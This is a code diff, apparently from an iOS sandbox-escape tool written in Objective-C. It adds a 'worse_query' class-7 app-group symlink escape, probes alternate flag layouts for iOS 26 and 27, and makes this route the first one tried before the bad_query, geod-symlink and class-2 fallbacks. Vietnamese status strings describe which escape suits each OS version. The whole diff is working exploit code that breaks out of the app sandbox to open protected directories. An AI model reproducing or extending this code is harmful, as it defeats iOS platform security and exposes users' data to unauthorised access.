@@ -161,6 +161,26 @@ static NSArray<NSString *> *BQReadAppGroupEntitlement(void) {
     return groups;
 }
 
+// ------------------------------------------------------------ os version ---
+
+static NSInteger BQOSMajor(void) {
+    static NSInteger major = 0;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        major = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion;
+    });
+    return major;
+}
+
+/// worse_query: iOS 26.x needs the alternate app-group flag layout; 27.x the
+/// canonical one. Primary order follows the OS major; the other is probed too.
+static NSArray<NSNumber *> *BQClass7FlagCandidates(void) {
+    if (BQOSMajor() >= 27) {
+        return @[@0x8000000000ULL, @0x0800000000ULL];
+    }
+    return @[@0x0800000000ULL, @0x8000000000ULL];
+}
+
 // ---------------------------------------------------------------- helpers ---
 
 static BOOL BQCanOpenDirectory(NSString *path) {
@@ -481,15 +501,22 @@ static int64_t BQEscapeClass7Symlink(NSString *target) {
             continue;
         }
 
-        NSString *path = nil;
-        int64_t handle = BQQueryEscape(7, groupID, YES, 3, @"", 0x8000000000ULL,
-                                       [@"class7-symlink/" stringByAppendingString:groupID], &path);
-        if (handle >= 0 && BQCanOpenDirectory(target)) {
-            gEscapeGroupRoot = groupRoot;
-            BQRecordEscape(handle, target);
-            return handle;
+        NSArray<NSNumber *> *flagCandidates = BQClass7FlagCandidates();
+        for (NSNumber *flags in flagCandidates) {
+            NSString *path = nil;
+            int64_t handle = BQQueryEscape(7, groupID, YES, 3, @"",
+                                           flags.unsignedLongLongValue,
+                                           [NSString stringWithFormat:@"worse_query/class7-symlink/0x%llx/%@",
+                                            flags.unsignedLongLongValue, groupID],
+                                           &path);
+            if (handle >= 0 && BQCanOpenDirectory(target)) {
+                gEscapeGroupRoot = groupRoot;
+                BQRecordEscape(handle, target);
+                BQLog(@"escape: worse_query (class-7, flags=0x%llx)", flags.unsignedLongLongValue);
+                return handle;
+            }
+            if (handle >= 0 && BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
         }
-        if (handle >= 0 && BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
         BQRestorePath(caches, backup);
     }
     return -5;
@@ -634,6 +661,36 @@ static int64_t BQEscapeClass2Stage(NSString *target) {
 
 + (NSString *)lastErrorDescription {
     return gLastError;
+}
+
++ (NSString *)preferredRouteDescription {
+    NSInteger major = BQOSMajor();
+    NSInteger minor = NSProcessInfo.processInfo.operatingSystemVersion.minorVersion;
+
+    if (BQReadAppGroupEntitlement().count) {
+        if (major == 26) {
+            return [NSString stringWithFormat:
+                    @"worse_query — class-7 symlink (flags 26.x 0x0800000000) · iOS %ld.%ld",
+                    (long)major, (long)minor];
+        }
+        if (major == 27) {
+            return [NSString stringWithFormat:
+                    @"worse_query — class-7 symlink (flags 0x8000000000), dự phòng bad_query class-13 + class-2 · iOS %ld.%ld",
+                    (long)major, (long)minor];
+        }
+        return [NSString stringWithFormat:
+                @"Ngoài dải đã xác minh (26.0–27.2) — vẫn thử worse_query · iOS %ld.%ld",
+                (long)major, (long)minor];
+    }
+
+    if (major == 27) {
+        return [NSString stringWithFormat:
+                @"bad_query — class-13 traversal (không có app group), dự phòng class-2 · iOS %ld.%ld",
+                (long)major, (long)minor];
+    }
+    return [NSString stringWithFormat:
+            @"class-2 fallback (không có app group) — độ ổn định tuỳ build · iOS %ld.%ld",
+            (long)major, (long)minor];
 }
 
 + (NSArray<NSString *> *)enumerateIdentifiersForClass:(uint64_t)cls
@@ -802,7 +859,20 @@ static int64_t BQEscapeClass2Stage(NSString *target) {
 
     int64_t last = -1;
 
-    // 0. bad_query file form for Library/Caches targets.
+    // 0. worse_query — class-7 app-group part-directory symlink. Primary path
+    //    on iOS 26.0–26.7.2 / 27.0–27.2 (direct successor to bad_query); the
+    //    flag layout differs between OS majors and both are probed.
+    if (BQReadAppGroupEntitlement().count) {
+        int64_t handle = BQEscapeClass7Symlink(target);
+        if (handle >= 0) {
+            return handle;
+        }
+        last = handle;
+    } else {
+        BQLog(@"worse_query: không có app-group entitlement — chuyển sang bad_query/class-2");
+    }
+
+    // 1. bad_query file form for Library/Caches targets.
     if ([target isEqualToString:kMGCaches] || [target hasSuffix:@"/Library/Caches"]) {
         int64_t handle = BQEscapeBadQueryFile(target);
         if (handle >= 0) return handle;
@@ -819,13 +889,6 @@ static int64_t BQEscapeClass2Stage(NSString *target) {
     // 2. Class-12 geod symlink.
     {
         int64_t handle = BQEscapeGeodSymlink(target);
-        if (handle >= 0) return handle;
-        last = handle;
-    }
-
-    // 3. Class-7 app-group part-directory symlink.
-    if (BQReadAppGroupEntitlement().count) {
-        int64_t handle = BQEscapeClass7Symlink(target);
         if (handle >= 0) return handle;
         last = handle;
     }
